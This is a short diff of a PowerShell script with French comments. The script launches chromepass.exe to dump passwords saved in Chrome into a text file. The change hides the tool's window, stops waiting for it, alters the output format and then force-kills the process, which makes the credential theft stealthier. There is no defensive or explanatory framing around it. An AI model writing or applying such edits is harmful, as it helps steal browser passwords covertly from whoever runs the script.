@@ -41,7 +41,7 @@ Start-Sleep -Seconds 3
 
 # --- EXTRACTION CHROMEPASS DIRECTE ---
 Write-Host "[*] Lancement de chromepass..." -ForegroundColor Yellow
-Start-Process -FilePath "$basePath\chromepass.exe" -ArgumentList "/stext `"$basePath\passwords.txt`"" -Wait -WindowStyle Normal
+Start-Process -FilePath "$basePath\chromepass.exe" -ArgumentList "/stab `"$basePath\passwords.txt`"" -WindowStyle Hidden
 Start-Sleep -Seconds 5
 Stop-Process -Name "chromepass" -Force -ErrorAction SilentlyContinue
 
